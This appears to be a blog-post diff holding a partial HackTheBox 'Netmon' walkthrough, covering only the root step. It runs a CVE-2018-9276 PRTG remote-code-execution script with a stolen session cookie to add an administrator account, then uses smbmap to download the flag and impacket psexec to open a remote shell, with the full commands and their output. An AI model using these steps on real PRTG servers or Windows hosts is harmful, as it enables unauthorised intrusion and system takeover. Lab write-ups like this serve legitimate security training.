@@ -1,0 +1,170 @@
+<blockquote>
+  <p>Netmon windows machine by HackTheBox.com partial guide for root.</p>
+</blockquote>
+
+<h2 id="priv-esc">Priv Esc</h2>
+<p>For my own notes I have recorded steps for root only.</p>
+
+<p>We find an RCE exploit ready to go on <code class="language-plaintext highlighter-rouge">www.exploit-db.com</code>
+<img src="/assets/img/Posts/Netmon/exploitdb.png" alt="exploitdb" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre></td><td class="rouge-code"><pre>
+./prtg-explot.sh <span class="nt">-u</span> http://10.10.10.152 <span class="nt">-c</span> <span class="s2">"OCTOPUS1813713946=e0FERUU4NzJCLTUyN0UtNDk1MC1BRTBGLTAyMjY0RkNGREU3RX0%3D"</span>
+
+<span class="o">[</span>+]#########################################################################[+] 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticated PRTG network Monitor remote code execution                <span class="o">[</span><span class="k">*</span><span class="o">]</span> 
+<span class="o">[</span>+]#########################################################################[+] 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Date: 11/03/2019                                                        <span class="o">[</span><span class="k">*</span><span class="o">]</span> 
+<span class="o">[</span>+]#########################################################################[+] 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            <span class="o">[</span><span class="k">*</span><span class="o">]</span> 
+<span class="o">[</span>+]#########################################################################[+] 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Vendor Homepage: https://www.paessler.com/prtg                          <span class="o">[</span><span class="k">*</span><span class="o">]</span> 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Version: 18.2.38                                                        <span class="o">[</span><span class="k">*</span><span class="o">]</span> 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> CVE: CVE-2018-9276                                                      <span class="o">[</span><span class="k">*</span><span class="o">]</span> 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Reference: https://www.codewatch.org/blog/?p<span class="o">=</span>453                        <span class="o">[</span><span class="k">*</span><span class="o">]</span> 
+<span class="o">[</span>+]#########################################################################[+] 
+
+<span class="c"># login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.</span>
+<span class="c"># run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!'                                                                                                                            </span>
+
+<span class="o">[</span>+]#########################################################################[+] 
+
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> file created 
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> sending notification wait....
+
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> adding a new user <span class="s1">'pentest'</span> with password <span class="s1">'P3nT3st'</span> 
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> sending notification wait....
+
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> adding a user pentest to the administrators group 
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> sending notification wait....
+
+
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> exploit completed new user <span class="s1">'pentest'</span> with password <span class="s1">'P3nT3st!'</span> created have fun! 
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>We run the script as per the instructions and we create an administrator password on the box.</p>
+
+<p>First way if you enumerated is to smbmap download:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>smbmap <span class="nt">-u</span> pentest <span class="nt">-p</span> <span class="s1">'P3nT3st!'</span> <span class="nt">-d</span> workgroup <span class="nt">-H</span> 10.10.10.152 <span class="nt">-R</span> <span class="s1">'C$\Users\Administrator\desktop'</span> <span class="nt">--download</span> <span class="s1">'C$\Users\Administrator\Desktop\root.txt'</span>
+<span class="o">[</span>+] Starting download: C<span class="nv">$\</span>Users<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt <span class="o">(</span>33 bytes<span class="o">)</span>
+<span class="o">[</span>+] File output to: /home/b3nny/htb/machines/Netmon/10.10.10.152-C_Users_Administrator_Desktop_root.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Second way is to use <code class="language-plaintext highlighter-rouge">psexec</code> for a remote shell:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>python3 /opt/impacket/examples/psexec.py pentest:<span class="s1">'P3nT3st!'</span>@10.10.10.152
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting shares on 10.10.10.152.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found writable share ADMIN<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading file SrZdztNL.exe
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Opening SVCManager on 10.10.10.152.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Creating service ZTRB on 10.10.10.152.....
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Starting service ZTRB.....
+<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
+Microsoft Windows <span class="o">[</span>Version 10.0.14393]
+<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;cd C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator
+ 
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt;dir
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 684B-9CE8
+
+<span class="nb">cd  </span>Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator
+
+02/25/2019  11:58 PM    &lt;DIR&gt;          <span class="nb">.</span>
+De02/25/2019  11:58 PM    &lt;DIR&gt;          ..
+02/03/2019  08:08 AM    &lt;DIR&gt;          Contacts
+02/03/2019  12:35 AM    &lt;DIR&gt;          Desktop
+02/03/2019  08:08 AM    &lt;DIR&gt;          Documents
+s02/03/2019  08:08 AM    &lt;DIR&gt;          Downloadskt
+op02/03/2019  08:08 AM    &lt;DIR&gt;          Favorites
+
+02/03/2019  08:08 AM    &lt;DIR&gt;          Links
+02/03/2019  08:08 AM    &lt;DIR&gt;          Music
+02/03/2019  08:08 AM    &lt;DIR&gt;          Pictures
+02/03/2019  08:08 AM    &lt;DIR&gt;          Saved Games
+02/03/2019  08:08 AM    &lt;DIR&gt;          Searches
+02/25/2019  11:06 PM    &lt;DIR&gt;          Videos
+               0 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
+              13 Dir<span class="o">(</span>s<span class="o">)</span>  12,060,950,528 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt;
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;type root.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
